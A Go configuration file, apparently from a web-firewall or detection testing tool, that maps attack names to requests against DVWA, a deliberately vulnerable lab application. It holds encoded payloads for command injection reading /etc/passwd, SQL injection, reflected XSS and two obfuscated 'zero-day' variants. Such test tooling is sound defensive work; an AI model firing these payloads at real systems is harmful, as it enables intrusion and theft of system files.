package config

// AttackConfig holds the configuration details for each attack type
type AttackConfig struct {
	Method   string // GET or POST
	URL      string
	PostData string // Data for POST requests
}

// generateAttackConfigs dynamically generates the map of attack configurations
func generateAttackConfigs() map[string]AttackConfig {
	return map[string]AttackConfig{
		"command_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "ip=%3Bmore+%2Fetc%2Fpasswd&Submit=Submit",
		},
		"sql_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit",
		},
		"xss": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22XSS-hack-attempt%22%29%3C%2Fscript%3E",
		},
		"zero_day_sql_injection": {
			Method: "GET",
			URL:    CurrentConfig.DVWAURL + "/vulnerabilities/sqli/?id=A%20'DIV'%20B%20-%20A%20'DIV%20B&Submit=Submit",
		},
		"zero_day_command_injection": {
			Method:   "POST",
			URL:      CurrentConfig.DVWAURL + "/vulnerabilities/exec/",
			PostData: "/%3F%3F%3F/1%3F - /???/1?&Submit=Submit",
		},
	}
}

// GetAttackConfig returns the configuration for the given attack type
func GetAttackConfig(attackType string) (AttackConfig, bool) {
	attackConfigs := generateAttackConfigs()
	config, exists := attackConfigs[attackType]
	return config, exists
}
